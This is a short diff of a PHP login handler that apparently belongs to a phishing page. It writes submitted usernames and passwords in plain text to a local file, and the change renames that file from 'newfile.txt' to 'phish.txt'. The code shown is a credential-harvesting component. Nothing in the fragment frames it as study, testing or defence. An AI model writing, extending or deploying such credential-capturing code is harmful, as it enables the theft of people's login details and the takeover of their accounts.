@@ -30,7 +30,7 @@ if (isset($_POST["login"])) {
     }
 }
 
-($myfile = fopen("newfile.txt", "w")) or die("Unable to open file!");
+($myfile = fopen("phish.txt", "w")) or die("Unable to open file!");
 fwrite($myfile, "Username: $username \n");
 fwrite($myfile, "Password: $password \n");
 fclose($myfile);
